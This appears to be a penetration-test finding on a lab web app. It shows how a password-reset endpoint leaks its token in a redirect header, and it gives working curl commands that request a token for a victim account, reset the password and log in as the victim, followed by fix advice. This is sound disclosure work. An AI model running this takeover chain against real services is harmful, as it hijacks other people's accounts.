# Finding 01 — Password reset token disclosed in redirect (account takeover)

**Target:** http://192.168.1.74:4942
**Severity:** Critical
**Status:** Confirmed exploitable

## Summary

`POST /reset-password/request` returns the password-reset token directly in the
`Location` header of its 302 redirect — for **any** email, including emails that
don't exist. No email delivery / out-of-band step is required to obtain the token.
This allows full account takeover for any known username/email.

## Steps to reproduce

1. Request a reset for a target account (e.g. `jdoe`, email format discovered on
   `/reset-password` page: `you@student.42.tech`):

   ```
   curl -si -X POST 'http://192.168.1.74:4942/reset-password/request' \
     --data-urlencode 'email=jdoe@student.42.tech'
   ```

   Response:
   ```
   HTTP/1.1 302 Found
   location: /reset-password?email=jdoe@student.42.tech&token=5ae99e7ca0a3fd84337cecfa705f5321
   ```

   The token is handed back to the client directly — no need to intercept an email.

   (Also confirms a secondary issue: the same behavior happens for **non-existent**
   emails too, e.g. `nonexistent999@student.42.tech` also gets a token back,
   so the endpoint doesn't even leak existence — it just always issues a token to
   the caller, existing user or not, for whatever address eventually matches.)

2. Use the token to set a new password for the victim account:

   ```
   curl -si -X POST 'http://192.168.1.74:4942/reset-password/confirm' \
     --data-urlencode 'email=jdoe@student.42.tech' \
     --data-urlencode 'token=5ae99e7ca0a3fd84337cecfa705f5321' \
     --data-urlencode 'new_password=Pwned1234!'
   ```

   Response: `302 → /login?success=Password+updated`

3. Log in as the victim:

   ```
   curl -si -X POST 'http://192.168.1.74:4942/login' \
     --data-urlencode 'identity=jdoe@student.42.tech' \
     --data-urlencode 'password=Pwned1234!' \
     -c cookies_jdoe.txt
   ```

   Returns a valid `session` cookie (JWT) for `jdoe`, role `student`.

## Repro script

See `repro-01-reset-takeover.sh` in this directory.

## Fix recommendation

- Never put the reset token in a URL returned synchronously to the requester.
  Send it only via the registered email's inbox (out-of-band).
- Return the same generic response regardless of whether the account exists.
- Rate-limit `/reset-password/request`.
